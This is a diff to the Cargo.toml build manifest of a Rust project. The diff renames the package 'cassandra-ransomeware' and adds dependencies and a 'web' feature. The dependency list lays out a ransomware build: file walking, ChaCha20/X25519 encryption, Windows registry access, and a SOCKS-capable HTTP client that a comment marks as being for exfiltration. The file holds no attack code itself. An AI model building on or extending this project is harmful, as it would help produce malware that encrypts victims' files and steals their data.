@@ -1,11 +1,12 @@
 [package]
-name = "Cassandra"
+name = "cassandra-ransomeware"
 version = "1.0.0"
 edition = "2021"
 
 [dependencies]
 walkdir = "2.5"
 rayon = "1.10"
+lazy_static = "1.4"
 chacha20poly1305 = "0.10"
 x25519-dalek = "2.0"
 rand = "0.8"
@@ -13,6 +14,7 @@ sha2 = "0.10"
 winreg = { version = "0.52", optional = true }
 serde = { version = "1.0", features = ["derive"] }
 serde_json = "1.0"
+toml = "0.8"
 reqwest = { version = "0.12", features = ["blocking", "socks", "json"] }  # สำหรับ exfiltrate (optional)
 chrono = { version = "0.4", features = ["serde"] }
 uuid = { version = "1.0", features = ["v4"] }
@@ -23,7 +25,12 @@ linfa-linear = "0.7"
 linfa-preprocessing = "0.7"
 linfa-clustering = "0.7"
 ndarray = "0.15"
+rocket = { version = "0.5.1", optional = true, features = ["json"] }
+tokio = { version = "1.0", features = ["full"], optional = true }
+rocket_db_pools = { version = "0.2.0", optional = true }
+rocket_dyn_templates = { version = "0.2.0", optional = true }
 
 [features]
 default = ["windows"]
 windows = ["winreg"]
+web = ["rocket", "rocket_db_pools", "rocket_dyn_templates", "tokio"]
